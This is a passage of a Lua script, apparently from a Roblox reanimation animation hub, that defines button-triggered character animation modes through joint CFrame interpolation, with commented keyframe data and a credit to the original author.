			--LeftArm,-0.9,0.4,0,8,90,0,0.25,4,0.5,0,0,8,-90,60,0,8,0,0.5,0.25,4,90,40,0.25,4,Torso,0,0.3,0.4,8,-90,0,0,8,0,0,0,4,0,20,0,8,0,0,0,8,-180,0,0,8,Head,0,0,0,8,-90,3.5,0.125,16,1,0,0,8,0,-22,0,8,0,0,0,8,-180,0,0,1.1,RightLeg,1,0,0,8,90,0,0,8,-1,0.4,-0.01,8,100,40,0,8,0,0,0,8,-90,0,0,8,LeftLeg,-1,0,0,8,90,0,0,8,-1,-0.4,-0.01,8,-100,40,0,8,0,0,0,8,90,0,0,8,RightArm,0.9,0.4,0,8,90,40,0,4,0.5,0,0,8,90,60,0,8,0,-0.5,-0.35,4,-90,10,-0.35,4
		end
	})
	addmode("h", {
		idle = function()
			Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * angles(-1.5707963267948966, -0.4363323129985824 * sin(sine * 8), -3.141592653589793), deltaTime) 
			RightHip.C0 = RightHip.C0:Lerp(cf(1, -1 + 0.3 * sin(sine * 8), 0) * angles(1.5707963267948966, 1.5707963267948966 + 0.5235987755982988 * sin(sine * 8), -1.5707963267948966), deltaTime) 
			LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-0.5, 1, 0) * angles(-0.5235987755982988, -1.5707963267948966 - 0.5235987755982988 * sin(sine * 8), 3.141592653589793), deltaTime) 
			RightShoulder.C0 = RightShoulder.C0:Lerp(cf(0.5, 1, 0) * angles(-0.5235987755982988, 1.5707963267948966 - 0.5235987755982988 * sin(sine * 8), 3.141592653589793), deltaTime) 
			RootJoint.C0 = RootJoint.C0:Lerp(cf(-0.1 * sin(sine * 8), 0.2 * sin((sine + 0.1) * 16), 0) * angles(-1.5707963267948966, 0.2617993877991494 * sin(sine * 8), -3.141592653589793), deltaTime) 
			LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -1 - 0.3 * sin(sine * 8), 0) * angles(1.5707963267948966, -1.5707963267948966 + 0.5235987755982988 * sin(sine * 8), 1.5707963267948966), deltaTime) 
			--Head,0,0,0,8,-90,0,0,8,1,0,0,8,0,-25,0,8,0,0,0,8,-180,0,0,8,RightLeg,1,0,0,8,90,0,0,8,-1,0.3,0,8,90,30,0,8,0,0,0,8,-90,0,0,8,LeftArm,-0.5,0,0,8,-30,0,0,8,1,0,0,8,-90,-30,0,8,0,0,0,8,180,0,0,8,RightArm,0.5,0,0,8,-30,0,0,8,1,0,0,16,90,-30,0,8,0,0,0,8,180,0,0,8,Torso,0,-0.1,0,8,-90,0,0,8,0,0.2,0.1,16,0,15,0,8,0,0,0,8,-180,0,0,8,LeftLeg,-1,0,0,8,90,0,0,8,-1,-0.3,0,8,-90,30,0,8,0,0,0,8,90,0,0,8,Fedora_Handle,8.657480066176504e-09,0,0,8,-6,0,0,8,-0.15052366256713867,0,0,8,0,0,0,8,-0.010221302509307861,0,0,8,0,0,0,8
		end
	})
	addmode("j", {
		idle = function()
			LeftHip.C0 = LeftHip.C0:Lerp(cf(-0.8, -1, -0.1) * angles(0.17453292519943295, -0.6981317007977318, 0), deltaTime) 
			LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-1.2, 0.5, 0) * angles(-0.3490658503988659 + 0.08726646259971647 * sin((sine + 0.1) * 4), 0, 0.6981317007977318 + 0.08726646259971647 * sin((sine + 0.1) * 4)), deltaTime) 
			RightHip.C0 = RightHip.C0:Lerp(cf(1.1, -1, 0) * angles(1.5707963267948966, 1.7453292519943295, -1.5707963267948966), deltaTime) 
			Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * angles(-1.5707963267948966 + 0.08726646259971647 * sin((sine + 0.1) * 4), 0, 2.792526803190927), deltaTime) 
			RootJoint.C0 = RootJoint.C0:Lerp(cf(0, -1.7 + 0.5 * sin(sine * 4), 0.15 * sin(sine * 4)) * angles(3.3161255787892263 + 0.17453292519943295 * sin(sine * 4), 0, 3.6651914291880923), deltaTime) 
			RightShoulder.C0 = RightShoulder.C0:Lerp(cf(0.8 + 0.4 * sin(sine * 4), 0.6 + 0.1 * sin(sine * 4), 0.4 - 0.25 * sin(sine * 4)) * angles(2.9670597283903604, 2.2689280275926285 - 0.17453292519943295 * sin(sine * 4), -1.4835298641951802 - 0.17453292519943295 * sin(sine * 4)), deltaTime) 
			--GalaxyBeautifulHair_Handle,-0.15000000596046448,0,0,1,0,0,0,1,0.10000000149011612,0,0,1,0,0,0,1,0,0,0,1,0,0,0,1,LeftLeg,-0.8,0,0,4,10,0,0,4,-1,0,0,4,-40,0,0,4,-0.1,0,0,4,0,0,0,4,LeftArm,-1.2,0,0,4,-20,5,0.1,4,0.5,0,0,4,0,0,0,4,0,0,0,4,40,5,0.1,4,Fedora_Handle,8.657480066176504e-09,0,0,1,-6,0,0,1,-0.15052366256713867,0,0,1,0,0,0,1,-0.010221302509307861,0,0,1,0,0,0,1,ValkyrieHelm_Handle,8.658389560878277e-09,0,0,1,-15,0,0,1,-0.2433757781982422,0,0,1,0,0,0,1,-0.2657628059387207,0,0,1,0,0,0,1,RightLeg,1.1,0,0,4,90,0,0,4,-1,0,0,4,100,0,0,4,0,0,0,4,-90,0,0,4,BlackIronAntlers_Handle,8.658389560878277e-09,0,0,1,0,0,0,1,-0.6500000953674316,0,0,1,0,0,0,1,0.19972775876522064,0,0,1,0,0,0,1,DevAwardsAdurite_Handle,0,0,0,1,0,0,0,1,-0.25,0,0,1,0,0,0,1,0,0,0,1,0,0,0,1,SilverthornAntlers_Handle,8.658389560878277e-09,0,0,1,0,0,0,1,-0.6500000953674316,0,0,1,0,0,0,1,0.19972775876522064,0,0,1,0,0,0,1,Head,0,0,0,4,-90,5,0.1,4,1,0,0,4,-0,0,0,4,0,0,0,4,160,0,0,4,Torso,0,0,0,4,190,10,0,4,-1.70,0.5,0,4,-0,0,0,4,0,0.15,0,4,210,0,0,4,RightArm,0.8,0.4,0,4,170,0,0,4,0.6,0.1,0,4,130,-10,0,4,0.4,-0.25,0,4,-85,-10,0,4
		end
	})
	addmode("k", {
		idle = function()
			Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * angles(-1.6580627893946132 - 0.08726646259971647 * sin((sine + 0.3333333333333333) * 12), -0.08726646259971647 * sin((sine + 0.2) * 6), 3.141592653589793), deltaTime) 
			LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -0.5 - 0.5 * sin((sine + 0.39999999999999997) * 12), -0.5) * angles(1.7453292519943295 - 1.0471975511965976 * sin(sine * 6), -1.5707963267948966 + 0.1308996938995747 * sin(sine * 6), 1.5707963267948966), deltaTime) 
			RightHip.C0 = RightHip.C0:Lerp(cf(1, -0.5 - 0.5 * sin((sine + 0.39999999999999997) * 12), -0.5) * angles(1.7453292519943295 + 1.0471975511965976 * sin(sine * 6), 1.5707963267948966 + 0.1308996938995747 * sin(sine * 6), -1.5707963267948966), deltaTime) 
			RootJoint.C0 = RootJoint.C0:Lerp(cf(0, -0.5 + 0.3 * sin((sine + 0.16666666666666666) * 12), 0) * angles(-1.3962634015954636 + 0.08726646259971647 * sin((sine + 0.3333333333333333) * 12), 0.08726646259971647 * sin((sine + 0.06666666666666667) * 6), 3.141592653589793), deltaTime) 
			LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-0.8 - 0.1 * sin(sine * 6), 0.5 + 0.1 * sin(sine * 6), -0.2) * angles(3.141592653589793 - 0.17453292519943295 * sin((sine + 0.39999999999999997) * 12), -0.17453292519943295, 1.5707963267948966), deltaTime) 
			RightShoulder.C0 = RightShoulder.C0:Lerp(cf(0.8 - 0.1 * sin(sine * 6), 0.5 - 0.1 * sin(sine * 6), -0.2) * angles(3.141592653589793 - 0.17453292519943295 * sin((sine + 0.39999999999999997) * 12), 0.17453292519943295, -1.5707963267948966), deltaTime) 
			--GalaxyBeautifulHair_Handle,-0.15000000596046448,0,0,1.5,0,0,0,1.5,0.10000000149011612,0,0,1.5,0,0,0,1.5,0,0,0,1.5,0,0,0,1.5,Head,0,0,0,6,-95,-5,0.3333333333333333,12,1,0,0,6,-0,-5,0.2,6,0,0,0,6,180,0,0,6,ValkyrieHelm_Handle,8.658389560878277e-09,0,0,1.5,-15,0,0,1.5,-0.2433757781982422,0,0,1.5,0,0,0,1.5,-0.2657628059387207,0,0,1.5,0,0,0,1.5,SilverthornAntlers_Handle,8.658389560878277e-09,0,0,1.5,0,0,0,1.5,-0.6500000953674316,0,0,1.5,0,0,0,1.5,0.19972775876522064,0,0,1.5,0,0,0,1.5,BlackIronAntlers_Handle,8.658389560878277e-09,0,0,1.5,0,0,0,1.5,-0.6500000953674316,0,0,1.5,0,0,0,1.5,0.19972775876522064,0,0,1.5,0,0,0,1.5,Fedora_Handle,8.657480066176504e-09,0,0,1.5,-6,0,0,1.5,-0.15052366256713867,0,0,1.5,0,0,0,1.5,-0.010221302509307861,0,0,1.5,0,0,0,1.5,LeftLeg,-1,0,0,6,100,-60,0,6,-0.5,-0.5,0.39999999999999997,12,-90,7.5,0,6,-0.5,0,0,6,90,0,0,6,EyelessSmileHead_Handle,-0.00043487548828125,0,0,1.5,180,0,0,1.5,0.6000361442565918,0,0,1.5,0,0,0,1.5,0.0003204345703125,0,0,1.5,180,0,0,1.5,RightLeg,1,0,0,6,100,60,0,6,-0.5,-0.5,0.39999999999999997,12,90,7.5,0,6,-0.5,0,0,6,-90,0,0,6,DevAwardsAdurite_Handle,0,0,0,1.5,0,0,0,1.5,-0.25,0,0,1.5,0,0,0,1.5,0,0,0,1.5,0,0,0,1.5,Torso,0,0,0,6,-80,5,0.3333333333333333,12,-0.5,0.3,0.16666666666666666,12,-0,5,0.06666666666666667,6,0,0,0,6,180,0,0,6,LeftArm,-0.8,-0.1,0,6,180,-10,0.39999999999999997,12,0.5,0.1,0,6,-10,0,0,6,-0.2,0,0,6,90,0,0,6,RightArm,0.8,-0.1,0,6,180,-10,0.39999999999999997,12,0.5,-0.1,0,6,10,0,0,6,-0.2,0,0,6,-90,0,0,6
		end
	})
	addmode("l", {
		idle = function()
			Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * angles(-1.5707963267948966 + 0.04363323129985824 * sin((sine + 0.1) * 1), -0.17453292519943295 * sin((sine + 0.1) * 5), -3.141592653589793), deltaTime) 
			RightHip.C0 = RightHip.C0:Lerp(cf(1, -1 + 0.2 * sin(sine * 5), -0.2 + 0.2 * sin(sine * 5)) * angles(2.181661564992912 - 0.8726646259971648 * sin(sine * 5), 1.9198621771937625 - 0.3490658503988659 * sin(sine * 5), -1.5707963267948966), deltaTime) 
			RightShoulder.C0 = RightShoulder.C0:Lerp(cf(0.7, 0.8, 0) * angles(1.0471975511965976 + 0.03490658503988659 * sin(sine * 10), 2.0943951023931953 + 0.10471975511965978 * sin((sine + 0.1) * 5), 1.5707963267948966), deltaTime) 
			LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -1 - 0.2 * sin(sine * 5), -0.2 - 0.2 * sin(sine * 5)) * angles(2.181661564992912 + 0.8726646259971648 * sin(sine * 5), -1.9198621771937625 - 0.3490658503988659 * sin(sine * 5), 1.5707963267948966), deltaTime) 
			RootJoint.C0 = RootJoint.C0:Lerp(cf(0, 0.15 + 0.4 * sin((sine - 0.5) * 10), 0) * angles(-1.4835298641951802, 0.17453292519943295 * sin(sine * 5), -3.141592653589793), deltaTime) 
			LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-0.7, 0.5, -0.3) * angles(1.7453292519943295, -0.8726646259971648, 1.5707963267948966), deltaTime) 
			--Head,0,0,0,5,-90,2.5,0.1,1,1,0,0,4,0,-10,0.1,5,0,0,0,4,-180,0,0,4,RightLeg,1,0,0,4,125,-50,0,5,-1,0.2,0,5,110,-20,0,5,-0.2,0.2,0,5,-90,0,0,4,RightArm,0.7,0,0,4,60,2,0,10,0.8,0,0,4,120,6,0.1,5,0,0,0,4,90,0,0,4,LeftLeg,-1,0,0,4,125,50,0,5,-1,-0.2,0,5,-110,-20,0,5,-0.2,-0.2,0,5,90,0,0,4,Torso,0,0,0,4,-85,0,0,4,0.15,0.4,-0.5,10,0,10,0,5,0,0,0,4,-180,0,0,4,LeftArm,-0.7,0,0,4,100,0,0,4,0.5,0,0,4,-50,0,0,4,-0.3,0,0,4,90,0,0,4
		end
	})
end)

btn("goofy trolus (goofy)", function()
	local t=reanimate()
	if type(t)~="table" then return end
	local velbycfrvec=t.velbycfrvec
	local raycastlegs=t.raycastlegs
	local getJoint=t.getJoint
	local RootJoint=getJoint("RootJoint")
	local RightShoulder=getJoint("Right Shoulder")
	local LeftShoulder=getJoint("Left Shoulder")
	local RightHip=getJoint("Right Hip")
	local LeftHip=getJoint("Left Hip")
	local Neck=getJoint("Neck")
	t.addmode("default", {
		idle = function()
			local rY, lY = raycastlegs()

			RightShoulder.C0 = RightShoulder.C0:Lerp(cf(1, 0.5, 0) * angles(0.6981317007977318 * sin((sine + 0.5) * 4), 1.5707963267948966 - 0.3490658503988659 * sin(sine * 4), 0), deltaTime) 
			LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-1, 0.5, 0) * angles(0.6981317007977318 * sin((sine + 0.5) * 4), -1.5707963267948966 + 0.3490658503988659 * sin(sine * 4), 0), deltaTime) 
			RightHip.C0 = RightHip.C0:Lerp(cf(1, -1 + rY, 0) * angles(1.5707963267948966 - 1.0471975511965976 * sin(sine * 4), 1.6580627893946132, -1.5707963267948966), deltaTime) 
			RootJoint.C0 = RootJoint.C0:Lerp(cf(0, -0.2 + 0.2 * sin((sine + 1) * 8), 0) * angles(-1.5707963267948966 + 0.6981317007977318 * sin(sine * 4), 0, 3.141592653589793), deltaTime) 
			LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -1 + lY, 0) * angles(1.5707963267948966 - 1.0471975511965976 * sin(sine * 4), -1.6580627893946132, 1.5707963267948966), deltaTime) 
			Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * angles(-1.5707963267948966 - 0.8726646259971648 * sin((sine + 0.25) * 4), 0, 3.141592653589793), deltaTime) 
			--RightArm,1,0,0,4,0,40,0.5,4,0.5,0,0,4,90,-20,0,4,0,0,0,4,0,0,0,4,LeftArm,-1,0,0,4,-0,40,0.5,4,0.5,0,0,4,-90,20,0,4,0,0,0,4,0,0,0,4,RightLeg,1,0,0,4,90,-60,0,4,-1,0,0,4,95,0,0,4,0,0,0,4,-90,0,0,4,Torso,0,0,0,4,-90,40,0,4,-0.2,0.2,1,8,-0,0,0,4,0,0,0,4,180,0,0,4,LeftLeg,-1,0,0,4,90,-60,0,4,-1,0,0,4,-95,0,0,4,0,0,0,4,90,0,0,4,Head,0,0,0,4,-90,-50,0.25,4,1,0,0,4,-0,0,0,4,0,0,0,4,180,0,0,4,CPlusPlusTextbook_Handle,8.658389560878277e-09,0,0,4,0,0,0,4,-0.25,0,0,4,0,0,0,4,-0.0002722442150115967,0,0,4,0,0,0,4
		end,
		walk = function()
			local fw, rt = velbycfrvec()

			Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * angles(-1.5707963267948966 + 0.5235987755982988 * sin((sine + 0.45) * 8), 0, 3.141592653589793), deltaTime) 
			RightShoulder.C0 = RightShoulder.C0:Lerp(cf(1, 0.5, 0) * angles(2.0943951023931953 - 1.7453292519943295 * sin((sine - 0.1) * 4), 1.9198621771937625, -1.5707963267948966), deltaTime) 
			RootJoint.C0 = RootJoint.C0:Lerp(cf(0, 0.25 + 0.5 * sin((sine - 0.125) * 8), 0) * angles(-1.5707963267948966 + 0.17453292519943295 * sin(sine * 8), 0, 3.141592653589793), deltaTime) 
			LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -1 - 1 * sin(sine * 4), 0) * angles(1.5707963267948966 - 1.2217304763960306 * sin((sine - 0.15) * 4) * fw, -1.5707963267948966 - 0.6108652381980153 * sin((sine - 0.15) * 4) * rt, 1.5707963267948966), deltaTime) 
			RightHip.C0 = RightHip.C0:Lerp(cf(1, -1 + 1 * sin(sine * 4), 0) * angles(1.5707963267948966 + 1.2217304763960306 * sin((sine - 0.15) * 4) * fw, 1.5707963267948966 + 0.6108652381980153 * sin((sine - 0.15) * 4) * rt, -1.5707963267948966), deltaTime) 
			LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-1, 0.5, 0) * angles(2.0943951023931953 + 1.7453292519943295 * sin((sine - 0.1) * 4), -1.7453292519943295, 1.5707963267948966), deltaTime) 
			--Head,0,0,0,4,-90,30,0.45,8,1,0,0,4,-0,0,0,4,0,0,0,4,180,0,0,4,CPlusPlusTextbook_Handle,8.658389560878277e-09,0,0,4,0,0,0,4,-0.25,0,0,4,0,0,0,4,-0.0002722442150115967,0,0,4,0,0,0,4,RightArm,1,0,0,4,120,-100,-0.1,4,0.5,0,0,4,110,0,0,4,0,0,0,4,-90,0,0,4,Torso,0,0,0,4,-90,10,0,8,0.25,0.5,-0.125,8,-0,0,0,4,0,0,0,4,180,0,0,4,LeftLeg,-1,0,0,4,90,-70,-0.15,4,-1,-1,0,4,-90,-35,-0.15,4,0,0,0,4,90,0,0,4,RightLeg,1,0,0,4,90,70,-0.15,4,-1,1,0,4,90,35,-0.15,4,0,0,0,4,-90,0,0,4,LeftArm,-1,0,0,4,120,100,-0.1,4,0.5,0,0,4,-100,0,0,4,0,0,0,4,90,0,0,4
		end
	})
end)

btn("good cop bad cop animations", function()
	local t=reanimate()
	if type(t)~="table" then return end
	local addmode=t.addmode
	local getJoint=t.getJoint
	local RootJoint=getJoint("RootJoint")
	local RightShoulder=getJoint("Right Shoulder")
	local LeftShoulder=getJoint("Left Shoulder")
	local RightHip=getJoint("Right Hip")
	local LeftHip=getJoint("Left Hip")
	local Neck=getJoint("Neck")
	t.setWalkSpeed(20)

	local ROOTC0 = angles(rad(-90), 0, rad(180))
	local NECKC0 = cf(0, 1, 0) * angles(rad(-90), 0, rad(180))
	local RIGHTSHOULDERC0 = cf(-0.5, 0, 0) * angles(0, rad(90), 0)
	local LEFTSHOULDERC0 = cf(0.5, 0, 0) * angles(0, rad(-90), 0)

	local Animation_Speed = 0

	--bruh yeah shackluster had a lot of math.rad(0) instead of just 0
	--and a lot of multyplying by angles(0, 0, 0)
	--and he had ArtificialHB
	--and he had a sine value increasing by 2/3 each frame
	--and a lot of variables with names saying other things
	--and he had both C0 and C1 lerps for the same animations
	local function C1lerps(iswalking)
		Animation_Speed = 0.45/deltaTime

		local sine = sine * 40
		if iswalking then
			RootJoint.C1 = RootJoint.C1:Lerp(ROOTC0 * cf(0, 0, 0.05 * cos(sine / (2.4))), 2 * 1.25 / Animation_Speed)
			Neck.C1 = Neck.C1:Lerp(cf(0, -0.5, 0) * angles(rad(-90), 0, rad(180)), 0.2 * 1.25 / Animation_Speed)
			RightHip.C1 = RightHip.C1:Lerp(cf(0.5, 0.875 - 0.125 * sin(sine / 4.8) - 0.15 * cos(sine / 2.4), 0) * angles(0, rad(90), 0) * angles(0, 0, rad(35 * cos(sine / 4.8))), 0.6 / Animation_Speed)
			LeftHip.C1 = LeftHip.C1:Lerp(cf(-0.5, 0.875 + 0.125 * sin(sine / 4.8) - 0.15 * cos(sine / 2.4), 0) * angles(0, rad(-90), 0) * angles(0, 0, rad(35 * cos(sine / 4.8))), 0.6 / Animation_Speed)
		else
			RootJoint.C1 = RootJoint.C1:Lerp(ROOTC0, 0.2 / Animation_Speed)
			Neck.C1 = Neck.C1:Lerp(cf(0, -0.5, 0) * angles(rad(-90), 0, rad(180)), 0.2 / Animation_Speed)
			RightHip.C1 = RightHip.C1:Lerp(cf(0.5, 1, 0) * angles(0, rad(90), 0), 0.7 / Animation_Speed)
			LeftHip.C1 = LeftHip.C1:Lerp(cf(-0.5, 1, 0) * angles(0, rad(-90), 0), 0.7 / Animation_Speed)

		end
	end

	local function jumplerps()
		local sine = sine * 40
		C1lerps()

		RootJoint.C0 = RootJoint.C0:Lerp(ROOTC0, 0.2 / Animation_Speed)
		Neck.C0 = Neck.C0:Lerp(NECKC0 * cf(0, 0, 0 + ((1) - 1)) * angles(rad(-20), 0, 0), 0.2 / Animation_Speed)
		RightShoulder.C0 = RightShoulder.C0:Lerp(cf(1.5, 0.5, 0) * angles(rad(-40), 0, rad(20)) * RIGHTSHOULDERC0, 0.2 / Animation_Speed)
		LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-1.5, 0.5, 0) * angles(rad(-40), 0, rad(-20)) * LEFTSHOULDERC0, 0.2 / Animation_Speed)
		RightHip.C0 = RightHip.C0:Lerp(cf(1, -1, -0.3) * angles(0, rad(90), 0) * angles(rad(-5), 0, rad(-20)), 0.2 / Animation_Speed)
		LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -1, -0.3) * angles(0, rad(-90), 0) * angles(rad(-5), 0, rad(20)), 0.2 / Animation_Speed)
	end
	local function falllerps()
		local sine = sine * 40
		C1lerps()

		RootJoint.C0 = RootJoint.C0:Lerp(ROOTC0, 0.2 / Animation_Speed)
		Neck.C0 = Neck.C0:Lerp(NECKC0 * cf(0, 0, 0 + ((1) - 1)) * angles(rad(20), 0, 0), 0.2 / Animation_Speed)
		RightShoulder.C0 = RightShoulder.C0:Lerp(cf(1.5, 0.5, 0) * angles(0, 0, rad(60)) * RIGHTSHOULDERC0, 0.2 / Animation_Speed)
		LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-1.5, 0.5, 0) * angles(0, 0, rad(-60)) * LEFTSHOULDERC0, 0.2 / Animation_Speed)
		RightHip.C0 = RightHip.C0:Lerp(cf(1, -1, 0) * angles(0, rad(90), 0) * angles(0, 0, rad(20)), 0.2 / Animation_Speed)
		LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -1, 0) * angles(0, rad(-90), 0) * angles(0, 0, rad(10)), 0.2 / Animation_Speed)
	end

	addmode("default", {
		idle = function()
			local sine = sine * 40
			C1lerps()

			RootJoint.C0 = RootJoint.C0:Lerp(ROOTC0 * cf(0.05 * cos(sine / 12), 0, 0 + 0.05 * sin(sine / 12)), 0.15 / Animation_Speed)
			Neck.C0 = Neck.C0:Lerp(NECKC0 * cf(0, 0, 0 + ((1) - 1)) * angles(rad(15 - 2.5 * sin(sine / 12)), 0, rad(-25)), 1 / Animation_Speed)
			RightShoulder.C0 = RightShoulder.C0:Lerp(cf(1.25, 0.5, 0.3) * angles(rad(-45), 0, rad(-45)) * RIGHTSHOULDERC0, 1 / Animation_Speed)
			LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-1.25, 0.5, 0.3) * angles(rad(-40), 0, rad(45)) * LEFTSHOULDERC0, 1 / Animation_Speed)
			RightHip.C0 = RightHip.C0:Lerp(cf(1 + 0.05 * cos(sine / 12), -1 - 0.05 * sin(sine / 12), -0.01) * angles(0, rad(85), 0) * angles(rad(-1), 0, 0), 0.15 / Animation_Speed)
			LeftHip.C0 = LeftHip.C0:Lerp(cf(-1 + 0.05 * cos(sine / 12), -1 - 0.05 * sin(sine / 12), -0.01) * angles(0, rad(-85), 0) * angles(rad(-1), 0, 0), 0.15 / Animation_Speed)
		end,
		walk = function()
			local sine = sine * 40
			C1lerps(true)

			RootJoint.C0 = RootJoint.C0:Lerp(ROOTC0 * cf(0, 0, -0.05), 0.15 / Animation_Speed)
			Neck.C0 = Neck.C0:Lerp(NECKC0 * cf(0, 0, 0 + ((1) - 1)) * angles(rad(5), 0, 0), 0.15 / Animation_Speed)
			RightShoulder.C0 = RightShoulder.C0:Lerp(cf(1.25, 0.5 + 0.05 * sin(sine / (2.4)), 0.3) * angles(rad(-45), 0, rad(-45)) * RIGHTSHOULDERC0, 1 / Animation_Speed)
			LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-1.25, 0.5 + 0.05 * sin(sine / (2.4)), 0.3) * angles(rad(-40), 0, rad(45)) * LEFTSHOULDERC0, 1 / Animation_Speed)
			RightHip.C0 = RightHip.C0:Lerp(cf(1, -1, 0) * angles(0, rad(80), 0) * angles(0, 0, rad(-5)), 2 / Animation_Speed)
			LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -1, 0) * angles(0, rad(-80), 0) * angles(0, 0, rad(5)), 2 / Animation_Speed)
		end,
		jump = jumplerps,
		fall = falllerps
	})
	addmode("f", {
		idle = function()
			local sine = sine * 40
			C1lerps()

			RootJoint.C0 = RootJoint.C0:Lerp(ROOTC0 * cf(0, 0, 0 + 0.05 * cos(sine / 12)), 1 / Animation_Speed)
			Neck.C0 = Neck.C0:Lerp(NECKC0 * cf(0, 0, 0 + ((1) - 1)) * angles(rad(-5 - 2.5 * cos(sine / 12)), 0, rad(25)), 1 / Animation_Speed)
			RightShoulder.C0 = RightShoulder.C0:Lerp(cf(0.9, 0.5 + 0.05 * sin(sine / 12), -0.5) * angles(rad(100), 0, rad(-70)) * RIGHTSHOULDERC0, 1 / Animation_Speed)
			LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-0.9, 0.25 + 0.05 * sin(sine / 12), -0.35) * angles(rad(70), 0, rad(80)) * LEFTSHOULDERC0, 1 / Animation_Speed)
			RightHip.C0 = RightHip.C0:Lerp(cf(1, -1 - 0.05 * cos(sine / 12), -0.01) * angles(0, rad(80), 0), 1 / Animation_Speed)
			LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -1 - 0.05 * cos(sine / 12), -0.01) * angles(0, rad(-80), 0), 1 / Animation_Speed)
		end,
		walk = function()
			local sine = sine * 40
			C1lerps(true)

			RootJoint.C0 = RootJoint.C0:Lerp(ROOTC0 * cf(0, 0, -0.05), 0.15 / Animation_Speed)
			Neck.C0 = Neck.C0:Lerp(NECKC0 * cf(0, 0, 0 + ((1) - 1)) * angles(rad(5), 0, 0), 0.15 / Animation_Speed)
			RightShoulder.C0 = RightShoulder.C0:Lerp(cf(0.9, 0.5 + 0.05 * sin(sine / (2.4)), -0.5) * angles(rad(100), 0, rad(-70)) * RIGHTSHOULDERC0, 1 / Animation_Speed)
			LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-0.9, 0.25 + 0.05 * sin(sine / (2.4)), -0.35) * angles(rad(70), 0, rad(80)) * LEFTSHOULDERC0, 1 / Animation_Speed)
			RightHip.C0 = RightHip.C0:Lerp(cf(1, -1, 0) * angles(0, rad(80), 0) * angles(0, 0, rad(-5)), 2 / Animation_Speed)
			LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -1, 0) * angles(0, rad(-80), 0) * angles(0, 0, rad(5)), 2 / Animation_Speed)
		end,
		jump = jumplerps,
		fall = falllerps
	})
end)
lbl("original by shackluster")
lbl("the classics never die")

btn("metamorphosis vibe", function()
	local t=reanimate()
	if type(t)~="table" then return end
	local addmode=t.addmode
	local getJoint=t.getJoint
	local velbycfrvec=t.velbycfrvec
	local RootJoint=getJoint("RootJoint")
	local RightShoulder=getJoint("Right Shoulder")
	local LeftShoulder=getJoint("Left Shoulder")
	local RightHip=getJoint("Right Hip")
	local LeftHip=getJoint("Left Hip")
	local Neck=getJoint("Neck")
	t.setWalkSpeed(4.5)

	addmode("default",{
		idle=function()
			Neck.C0=Neck.C0:Lerp(cf(0,1,0)*angles(-1.7453292519943295-0.08726646259971647*sin(sine*8),-0.12217304763960307*sin((sine+0.2)*4),2.8797932657906435+0.2007128639793479*sin((sine+0.15)*4)),deltaTime) 
			RightHip.C0=RightHip.C0:Lerp(cf(1,-1+0.1*sin(sine*4),0)*angles(1.5707963267948966,1.5707963267948966+0.17453292519943295*sin(sine*4),-1.5707963267948966),deltaTime) 
			RightShoulder.C0=RightShoulder.C0:Lerp(cf(1,0.3,0)*angles(2.530727415391778+0.20943951023931956*sin((sine+0.4)*8),1.5707963267948966-0.4363323129985824*sin((sine+0.2)*4),-1.5707963267948966),deltaTime) 
			LeftShoulder.C0=LeftShoulder.C0:Lerp(cf(-1,0.5,0)*angles(1.0471975511965976,-1.2217304763960306+0.08726646259971647*sin((sine+0.2)*4),1.5707963267948966),deltaTime) 
			LeftHip.C0=LeftHip.C0:Lerp(cf(-1,-1-0.1*sin(sine*4),0)*angles(1.5707963267948966,-1.5707963267948966+0.17453292519943295*sin(sine*4),1.5707963267948966),deltaTime) 
			RootJoint.C0=RootJoint.C0:Lerp(cf(-0.1 * sin(sine*4),0,0)*angles(-1.5707963267948966,0.08726646259971647*sin(sine*4),3.141592653589793),deltaTime) 
			--MW_animatorProgressSave: Fedora_Handle,8.657480066176504e-09,0,0,4,-6,0,0,4,-0.15052366256713867,0,0,4,0,0,0,4,-0.010221302509307861,0,0,4,0,0,0,4,Bandana_Handle,3.9362930692732334e-09,0,0,4,0,0,0,4,0.3000001907348633,0,0,4,0,0,0,4,-0.6002722978591919,0,0,4,0,0,0,4,Head,0,0,0,4,-100,-5,0,8,1,0,0,4,-0,-7,0.2,4,0,0,0,4,165,11.5,0.15,4,RightLeg,1,0,0,4,90,0,0,4,-1,0.1,0,4,90,10,0,4,0,0,0,4,-90,0,0,4,RightArm,1,0,0,4,145,12,0.4,8,0.3,0,0,4,90,-25,0.2,4,0,0,0,4,-90,0,0,4,LeftArm,-1,0,0,4,60,0,0,4,0.5,0,0,4,-70,5,0.2,4,0,0,0,4,90,0,0,4,LeftLeg,-1,0,0,4,90,0,0,4,-1,-0.1,0,4,-90,10,0,4,0,0,0,4,90,0,0,4,Torso,0,-0.1,0,4,-90,0,0,4,0,0,0,4,-0,5,0,4,0,0,0,4,180,0,0,4
		end,
		walk=function()
			local fw,rt=velbycfrvec()

			Neck.C0=Neck.C0:Lerp(cf(0,1,0)*angles(-1.5707963267948966+0.08726646259971647*sin((sine-0.1)*8),0.3490658503988659*sin((sine-0.07)*4),3.141592653589793-0.4363323129985824*sin((sine-0.4)*4)),deltaTime) 
